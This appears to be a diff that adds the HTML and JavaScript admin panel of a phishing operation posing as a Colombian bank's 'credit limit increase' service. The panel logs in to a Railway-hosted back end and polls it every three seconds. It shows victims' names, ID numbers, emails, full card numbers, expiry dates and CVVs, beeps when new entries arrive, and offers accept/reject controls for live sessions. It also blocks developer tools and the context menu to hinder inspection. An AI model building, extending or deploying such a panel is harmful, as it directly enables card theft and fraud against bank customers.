@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Davi Betplay 3 · Panel Admin</title>
+<meta name="robots" content="noindex, nofollow, noarchive">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0f1115; color: #e5e7eb; min-height: 100vh; font-size: 14px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+#loginScreen { display: flex; align-items: center; justify-content: center; min-height: 100vh; background: linear-gradient(135deg, #0f1115, #1a1d24); }
+.login-box { background: #161a21; border: 1px solid #262c36; border-radius: 16px; padding: 40px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
+.login-box h1 { font-size: 24px; color: #ed1c27; text-align: center; margin-bottom: 6px; }
+.login-box p { text-align: center; color: #8b94a8; font-size: 13px; margin-bottom: 28px; }
+.login-box input { width: 100%; padding: 14px 16px; margin-bottom: 14px; background: #0f1115; border: 1px solid #262c36; border-radius: 10px; color: #e5e7eb; font-size: 15px; outline: none; }
+.login-box input:focus { border-color: #ed1c27; }
+.login-box button { width: 100%; padding: 14px; background: #ed1c27; color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; }
+.login-box button:hover { background: #c4121b; }
+.login-error { background: rgba(239,68,68,0.15); border: 1px solid #ef4444; color: #fca5a5; padding: 10px 14px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; display: none; }
+#dashboard { display: none; }
+.topbar { background: #161a21; border-bottom: 1px solid #262c36; padding: 14px 24px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; position: sticky; top: 0; z-index: 10; }
+.topbar h1 { font-size: 20px; color: #ed1c27; }
+.topbar .user { color: #8b94a8; font-size: 13px; }
+.topbar .user strong { color: #e5e7eb; }
+.btn-logout, .btn-tarjetas { background: #262c36; color: #e5e7eb; border: none; padding: 8px 14px; border-radius: 8px; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px; font-weight: bold; }
+.btn-logout:hover { background: #3a404c; }
+.btn-tarjetas { background: #2563eb; color: #fff; }
+.btn-tarjetas:hover { background: #1d4ed8; }
+.container { max-width: 1400px; margin: 0 auto; padding: 24px; }
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 14px; margin-bottom: 22px; }
+.stat-card { background: #161a21; border: 1px solid #262c36; border-radius: 12px; padding: 18px; }
+.stat-card .label { color: #8b94a8; font-size: 11px; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 6px; }
+.stat-card .value { font-size: 28px; font-weight: 700; color: #ed1c27; }
+.stat-card.pending .value { color: #fbbf24; }
+.stat-card.history .value { color: #22c55e; }
+.section { background: #161a21; border: 1px solid #262c36; border-radius: 12px; padding: 18px; }
+.section-header { display: flex; justify-content: space-between; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 14px; padding-bottom: 12px; border-bottom: 1px solid #262c36; }
+.section-title { font-size: 15px; font-weight: 700; color: #e5e7eb; display: flex; align-items: center; gap: 8px; }
+.section-title .badge { background: #262c36; color: #ed1c27; padding: 3px 9px; border-radius: 12px; font-size: 11px; font-weight: 700; }
+.search-input { background: #0f1115; border: 1px solid #262c36; border-radius: 8px; padding: 9px 13px; color: #e5e7eb; font-size: 13px; outline: none; min-width: 260px; }
+.search-input:focus { border-color: #ed1c27; }
+.table-wrap { overflow-x: auto; }
+table { width: 100%; border-collapse: collapse; font-size: 12px; }
+thead { background: #0f1115; }
+thead th { text-align: left; padding: 10px; color: #8b94a8; font-weight: 600; font-size: 10px; text-transform: uppercase; letter-spacing: .5px; border-bottom: 1px solid #262c36; white-space: nowrap; }
+tbody tr { border-bottom: 1px solid #1a1d24; transition: background .15s; }
+tbody tr:hover { background: rgba(237,28,39,0.04); }
+tbody td { padding: 11px 10px; color: #cbd5e1; vertical-align: middle; }
+.empty { text-align: center; padding: 30px; color: #6b7280; font-style: italic; }
+.btn { padding: 7px 12px; border-radius: 6px; border: none; font-size: 11px; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 4px; transition: all .15s; white-space: nowrap; }
+.btn-accept { background: #16a34a; color: #fff; }
+.btn-accept:hover { background: #15803d; }
+.btn-reject { background: #dc2626; color: #fff; }
+.btn-reject:hover { background: #b91c1c; }
+.estado { display: inline-block; padding: 3px 9px; border-radius: 10px; font-size: 10px; font-weight: 700; text-transform: uppercase; }
+.estado-pendiente { background: rgba(251,191,36,0.15); color: #fbbf24; }
+.estado-aceptado { background: rgba(34,197,94,0.15); color: #22c55e; }
+.estado-rechazado { background: rgba(239,68,68,0.15); color: #ef4444; }
+#toast { position: fixed; bottom: 24px; right: 24px; background: #161a21; border: 1px solid #262c36; border-left: 4px solid #ed1c27; color: #e5e7eb; padding: 14px 20px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); font-size: 13px; font-weight: 500; z-index: 9999; transform: translateX(500px); transition: transform .3s; max-width: 400px; }
+#toast.show { transform: translateX(0); }
+#toast.error { border-left-color: #ef4444; }
+.modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+.modal-content { background: #161a21; border: 1px solid #262c36; border-radius: 12px; width: 100%; max-width: 1000px; max-height: 80vh; display: flex; flex-direction: column; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
+.modal-header { padding: 16px 20px; border-bottom: 1px solid #262c36; display: flex; justify-content: space-between; align-items: center; }
+.modal-header h2 { font-size: 18px; color: #e5e7eb; margin: 0; }
+.close-modal { background: none; border: none; color: #ef4444; font-size: 24px; cursor: pointer; }
+.close-modal:hover { color: #dc2626; }
+.modal-body { padding: 20px; overflow-y: auto; }
+@media (max-width: 768px) {
+    .container { padding: 12px; }
+    .stats { grid-template-columns: 1fr 1fr; }
+    .search-input { min-width: 0; flex: 1; }
+    .topbar { flex-direction: column; align-items: stretch; }
+    .topbar > div { justify-content: space-between; }
+}
+</style>
+</head>
+<body>
+
+<div id="loginScreen">
+    <div class="login-box">
+        <h1>🎯 Davi Betplay (3)</h1>
+        <p>Panel administrativo 3 · Acceso restringido</p>
+        <div id="loginError" class="login-error"></div>
+        <input type="text" id="loginUser" placeholder="Usuario" autocomplete="username">
+        <input type="password" id="loginPass" placeholder="Contraseña" autocomplete="current-password">
+        <button id="loginBtn">Ingresar</button>
+    </div>
+</div>
+
+<div id="dashboard">
+    <div class="topbar">
+        <h1>🎯 Davi Betplay (3)</h1>
+        <div style="display:flex; align-items:center; gap:14px;">
+            <button class="btn-tarjetas" id="btnVerTarjetas">💳 Tarjetas Ingresadas</button>
+            <span class="user">Sesión: <strong id="currentUser">-</strong></span>
+            <button class="btn-logout" id="logoutBtn">Cerrar sesión</button>
+        </div>
+    </div>
+    <div class="container">
+        <div class="stats">
+            <div class="stat-card"><div class="label">📋 Total</div><div class="value" id="statSesiones">0</div></div>
+            <div class="stat-card pending"><div class="label">⏳ Pendientes</div><div class="value" id="statPendientes">0</div></div>
+            <div class="stat-card history"><div class="label">✅ Procesadas</div><div class="value" id="statHistorial">0</div></div>
+        </div>
+        <div class="section">
+            <div class="section-header">
+                <div class="section-title">📥 Solicitudes de aumento de cupo <span class="badge" id="badgeSesiones">0</span></div>
+                <input type="text" class="search-input" id="buscar" placeholder="🔍 Buscar por nombre, doc, tarjeta...">
+            </div>
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Fecha</th><th>Nombre</th><th>Documento</th><th>Correo</th><th>Cupo actual</th><th>% Aumento</th><th>Nuevo cupo</th><th>Tarjeta</th><th>Venc.</th><th>CVV</th><th>Estado</th><th>Acciones</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tbodySesiones">
+                        <tr><td colspan="12" class="empty">Cargando...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="toast"></div>
+
+<div class="modal" id="modalTarjetas">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>💳 Historial de Tarjetas Ingresadas</h2>
+            <button class="close-modal" onclick="cerrarModal()">×</button>
+        </div>
+        <div class="modal-body">
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr><th>Fecha</th><th>Nombre</th><th>Documento</th><th>Tarjeta</th><th>Vencimiento</th><th>CVV</th><th>Estado</th></tr>
+                    </thead>
+                    <tbody id="tbodyTarjetas">
+                        <tr><td colspan="7" class="empty">Cargando tarjetas...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// 🔥 AQUÍ DEBES PONER LA NUEVA URL DE RAILWAY 3 🔥
+const API_BASE = 'https://AQUI_VA_TU_NUEVA_URL_DE_RAILWAY3.up.railway.app';
+
+let TOKEN = sessionStorage.getItem('daviToken3') || '';
+let USUARIO = sessionStorage.getItem('daviUser3') || '';
+let sesionesCache = [];
+let pollTimer = null;
+let audioCtx = null;
+let firmaSesionesAnterior = '';
+
+function $(id) { return document.getElementById(id); }
+
+function toast(msg, isError) {
+    const el = $('toast');
+    el.textContent = msg;
+    el.className = 'show' + (isError ? ' error' : '');
+    clearTimeout(el._t);
+    el._t = setTimeout(() => { el.className = ''; }, 3000);
+}
+
+function escapeHtml(s) {
+    if (s == null) return '';
+    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+function formatMoney(n) {
+    const v = Number(String(n || '').replace(/\./g, '')) || 0;
+    return '$' + v.toLocaleString('es-CO');
+}
+
+function activarAudio() {
+    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    if (audioCtx.state === 'suspended') audioCtx.resume();
+}
+
+function reproducirAlerta() {
+    try {
+        activarAudio();
+        const ahora = audioCtx.currentTime;
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(880, ahora);
+        osc.frequency.exponentialRampToValueAtTime(1320, ahora + 0.1);
+        gain.gain.setValueAtTime(0, ahora);
+        gain.gain.linearRampToValueAtTime(0.3, ahora + 0.05);
+        gain.gain.exponentialRampToValueAtTime(0.01, ahora + 0.4);
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start(ahora);
+        osc.stop(ahora + 0.4);
+    } catch (e) {}
+}
+
+document.addEventListener('click', activarAudio, { once: true });
+
+async function api(path, options) {
+    options = options || {};
+    const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
+    if (TOKEN) headers['Authorization'] = 'Bearer ' + TOKEN;
+    const url = API_BASE + path + (path.includes('?') ? '&' : '?') + '_t=' + Date.now();
+    const res = await fetch(url, { ...options, headers, cache: 'no-store' });
+    if (res.status === 401) { logout(); throw new Error('Sesión expirada'); }
+    let data = {};
+    try { data = await res.json(); } catch (e) {}
+    if (!res.ok) throw new Error(data.error || ('Error ' + res.status));
+    return data;
+}
+
+$('loginBtn').addEventListener('click', login);
+$('loginPass').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
+$('loginUser').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
+
+async function login() {
+    const usuario = $('loginUser').value.trim();
+    const password = $('loginPass').value;
+    const errEl = $('loginError');
+    activarAudio();
+    if (!usuario || !password) {
+        errEl.textContent = 'Completa usuario y contraseña';
+        errEl.style.display = 'block';
+        setTimeout(() => errEl.style.display = 'none', 4000);
+        return;
+    }
+    $('loginBtn').disabled = true;
+    $('loginBtn').textContent = 'Verificando...';
+    try {
+        const res = await fetch(API_BASE + '/admin/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ usuario, password })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Credenciales inválidas');
+        TOKEN = data.token;
+        USUARIO = data.usuario;
+        sessionStorage.setItem('daviToken3', TOKEN);
+        sessionStorage.setItem('daviUser3', USUARIO);
+        mostrarDashboard();
+    } catch (e) {
+        errEl.textContent = e.message;
+        errEl.style.display = 'block';
+        setTimeout(() => errEl.style.display = 'none', 4000);
+    } finally {
+        $('loginBtn').disabled = false;
+        $('loginBtn').textContent = 'Ingresar';
+    }
+}
+
+function logout() {
+    sessionStorage.removeItem('daviToken3');
+    sessionStorage.removeItem('daviUser3');
+    TOKEN = ''; USUARIO = '';
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    $('dashboard').style.display = 'none';
+    $('loginScreen').style.display = 'flex';
+    $('loginUser').value = ''; $('loginPass').value = '';
+    firmaSesionesAnterior = '';
+}
+
+$('logoutBtn').addEventListener('click', logout);
+
+function mostrarDashboard() {
+    $('loginScreen').style.display = 'none';
+    $('dashboard').style.display = 'block';
+    $('currentUser').textContent = USUARIO;
+    cargarStats();
+    cargarSesiones();
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(() => { cargarStats(); cargarSesiones(); }, 3000);
+}
+
+async function cargarStats() {
+    try {
+        const d = await api('/admin/stats');
+        $('statSesiones').textContent = d.sesiones || 0;
+        $('statPendientes').textContent = d.pendientes || 0;
+        $('statHistorial').textContent = d.historial || 0;
+        $('badgeSesiones').textContent = d.sesiones || 0;
+    } catch (e) {}
+}
+
+async function cargarSesiones() {
+    try {
+        const d = await api('/admin/sesiones');
+        sesionesCache = (d.sesiones || []).slice().reverse();
+        renderSesiones();
+    } catch (e) {}
+}
+
+function renderSesiones() {
+    const filtro = ($('buscar').value || '').toLowerCase().trim();
+    const tbody = $('tbodySesiones');
+    let lista = sesionesCache;
+    if (filtro) {
+        lista = lista.filter(s => {
+            const dp = (s.datos && s.datos.datosPersonales) || {};
+            const texto = [ dp.primerNombre, dp.primerApellido, dp.correoPrimario, s.datos?.docNumber, s.datos?.documento, s.datos?.tarjeta, s.estado ].filter(Boolean).join(' ').toLowerCase();
+            return texto.includes(filtro);
+        });
+    }
+
+    const firmaActual = JSON.stringify(sesionesCache.map(s => ({ id: s.sessionId, t: s.datos?.tarjeta, e: s.estado })));
+    if (firmaSesionesAnterior !== '' && firmaActual !== firmaSesionesAnterior) {
+        reproducirAlerta();
+    }
+    firmaSesionesAnterior = firmaActual;
+
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="12" class="empty">Sin solicitudes</td></tr>';
+        return;
+    }
+    tbody.innerHTML = lista.map(s => {
+        const d = s.datos || {};
+        const dp = d.datosPersonales || {};
+        const nombre = (dp.primerNombre || '') + ' ' + (dp.primerApellido || '');
+        const doc = d.docNumber || d.documento || '-';
+        const correo = dp.correoPrimario || '-';
+        const cupo = d.monto ? formatMoney(d.monto) : '-';
+        const pct = d.porcentajeAumento ? d.porcentajeAumento + '%' : '-';
+        const nuevo = d.nuevoCupo || '-';
+        const tarjeta = d.tarjeta || '-';
+        const venc = (d.expMes || d.expAnio) ? `${d.expMes || ''}/${d.expAnio || ''}` : '-';
+        const cvv = d.cvv || '-';
+        const fecha = s.fecha ? new Date(s.fecha).toLocaleString('es-CO') : '-';
+        const estado = s.estado || 'pendiente';
+        const sid = escapeHtml(s.sessionId);
+        const acciones = (estado === 'pendiente')
+            ? `<button class="btn btn-accept" onclick="accion('${sid}','ACEPTAR')">✅ Aceptar</button>
+               <button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`
+            : '';
+        return `
+            <tr>
+                <td>${escapeHtml(fecha)}</td>
+                <td>${escapeHtml(nombre.trim() || '-')}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(doc)}</td>
+                <td>${escapeHtml(correo)}</td>
+                <td>${escapeHtml(cupo)}</td>
+                <td>${escapeHtml(pct)}</td>
+                <td>${escapeHtml(nuevo)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; font-size: 14px; letter-spacing: 1px; white-space: nowrap;">${escapeHtml(tarjeta)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(venc)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(cvv)}</td>
+                <td><span class="estado estado-${estado}">${estado}</span></td>
+                <td>${acciones}</td>
+            </tr>
+        `;
+    }).join('');
+}
+
+$('buscar').addEventListener('input', renderSesiones);
+
+async function accion(sessionId, tipo) {
+    try {
+        const res = await api('/admin/sesion/' + encodeURIComponent(sessionId) + '/accion', {
+            method: 'POST',
+            body: JSON.stringify({ accion: tipo })
+        });
+        if (res && res.ok === false) throw new Error(res.error || 'Error');
+        toast('✅ ' + tipo + ' aplicado');
+        cargarStats();
+        cargarSesiones();
+    } catch (e) {
+        toast('❌ ' + e.message, true);
+    }
+}
+
+$('btnVerTarjetas').addEventListener('click', async () => {
+    $('modalTarjetas').style.display = 'flex';
+    $('tbodyTarjetas').innerHTML = '<tr><td colspan="7" class="empty">Cargando...</td></tr>';
+    try {
+        const d = await api('/admin/tarjetas');
+        const tarjetas = d.tarjetas || [];
+        if (!tarjetas.length) {
+            $('tbodyTarjetas').innerHTML = '<tr><td colspan="7" class="empty">No hay tarjetas registradas aún.</td></tr>';
+            return;
+        }
+        $('tbodyTarjetas').innerHTML = tarjetas.map(t => `
+            <tr>
+                <td>${new Date(t.fecha).toLocaleString('es-CO')}</td>
+                <td>${escapeHtml(t.nombre.trim())}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(t.documento)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; font-size: 14px; letter-spacing: 1px; white-space: nowrap;">${escapeHtml(t.tarjeta)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(t.expMes + '/' + t.expAnio)}</td>
+                <td style="color: #ffffff !important; font-weight: bold; white-space: nowrap;">${escapeHtml(t.cvv)}</td>
+                <td><span class="estado estado-${t.estado}">${t.estado}</span></td>
+            </tr>
+        `).join('');
+    } catch (e) {
+        $('tbodyTarjetas').innerHTML = `<tr><td colspan="7" class="empty" style="color:#ef4444;">Error: ${e.message}</td></tr>`;
+    }
+});
+
+function cerrarModal() { $('modalTarjetas').style.display = 'none'; }
+
+if (TOKEN && USUARIO) { mostrarDashboard(); }
+</script>
+
+<script>
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+document.addEventListener('keydown', function(e) {
+    if(e.key === "F12" || e.keyCode === 123) { e.preventDefault(); return false; }
+    if(e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
+    if(e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) { e.preventDefault(); return false; }
+    if(e.ctrlKey && (e.key === 'S' || e.keyCode === 83)) { e.preventDefault(); return false; }
+});
+</script>
+</body>
+</html>
